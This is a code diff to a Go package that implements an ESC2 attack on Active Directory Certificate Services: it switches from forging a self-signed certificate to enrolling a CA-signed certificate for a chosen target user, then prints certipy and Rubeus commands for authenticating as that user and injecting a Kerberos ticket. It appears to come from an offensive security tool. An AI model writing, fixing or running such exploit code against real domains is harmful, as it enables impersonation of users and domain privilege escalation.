@@ -2,8 +2,6 @@ package pki
 
 import (
 	"crypto/ecdsa"
-	"crypto/elliptic"
-	"crypto/rand"
 	"crypto/x509"
 	"fmt"
 )
@@ -112,18 +110,13 @@ func ExploitESC2(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	fmt.Printf("[*] EKUs: %v\n", vulnTemplate.EKUs)
 	fmt.Printf("[*] Manager approval: %v\n", vulnTemplate.RequiresManagerApproval)
 
-	// Step 2: Generate signing key and forge certificate with target UPN
-	signingKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	// Step 2: Enroll for a CA-signed certificate with target UPN
+	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, false)
 	if err != nil {
-		return nil, nil, fmt.Errorf("generate signing key: %w", err)
+		return nil, nil, fmt.Errorf("enrollment failed: %w", err)
 	}
 
-	cert, certKey, err := ForgeCertificate(signingKey, targetUPN)
-	if err != nil {
-		return nil, nil, fmt.Errorf("forge cert: %w", err)
-	}
-
-	fmt.Printf("[+] Forged certificate for %s via ESC2 on template %q\n", targetUPN, templateName)
+	fmt.Printf("[+] Certificate obtained for %s via ESC2 on template %q\n", targetUPN, templateName)
 	fmt.Printf("[*] Next steps:\n")
 	fmt.Printf("    certipy auth -pfx cert.pfx -dc-ip %s\n", cfg.TargetDC)
 	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:cert.pfx /ptt\n", targetUPN)
